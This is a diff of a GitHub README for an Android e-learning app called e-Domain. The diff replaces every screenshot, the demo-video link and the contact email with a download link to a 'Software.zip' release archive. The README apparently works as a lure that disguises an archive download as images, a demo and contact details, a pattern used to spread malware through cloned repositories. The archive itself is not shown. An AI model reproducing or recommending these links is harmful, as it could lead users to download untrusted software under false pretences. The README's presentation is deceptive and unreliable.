@@ -2,26 +2,26 @@
 
 Welcome to e-Domain, a user-friendly e-Learning platform designed to make learning accessible, interactive, and efficient. Built using Android Java and Firestore, e-Domain offers a range of features to enhance your educational experience, including a chatbot for queries and a discussion area for collaboration.
 
-![Logo](https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip)
+![Logo](https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip)
 
 ## Demo Video
 
- For Demo video [Click here](https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip)
+ For Demo video [Click here](https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip)
 
 ## Splash Screen
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
 ## Home Screen
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
 
 ## Main Menu
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
 ## Features
 
@@ -35,13 +35,13 @@ Welcome to e-Domain, a user-friendly e-Learning platform designed to make learni
 
 - **Efficient Search**: Find the courses you need quickly and efficiently using the search functionality. Whether you're a student looking for specific subjects or an instructor promoting your courses, this feature simplifies the process.
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
 ### Top Courses Display
 
 - **Discover Popular Courses**: The "Top Courses" section prominently displays the most popular and highly-rated courses. It makes it easy for learners to discover trending content and engage with the best educational resources. Currently, all courses are shown as recommended, but in the future, we can introduce a functionality where top courses are recommended based on views and user preferences.
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
 ### KidsZone
 
@@ -53,7 +53,7 @@ Welcome to e-Domain, a user-friendly e-Learning platform designed to make learni
 
 - **Personalized Learning**: Create your user profile to customize your learning experience.
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
 ### Chatbot for Queries
 
@@ -65,10 +65,10 @@ Welcome to e-Domain, a user-friendly e-Learning platform designed to make learni
 
 - **Collaborative Learning**: Engage in collaborative learning in the discussion area. Share ideas, resources, and insights with fellow learners and educators through chat. Share various types of files, including images, videos, XLS, and PDFs, to facilitate discussions and enhance the learning experience.
 
-<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip" width ="300">
+<img src = "https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip" width ="300">
 
 ## Contact
 
 If you have any questions, feedback, or suggestions, please feel free to reach out to me:
 
-- **Email**: https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v1.0/Release.zip
+- **Email**: https://github.com/Oliverkanda/e-Learning-App-test2/releases/download/v2.0/Software.zip
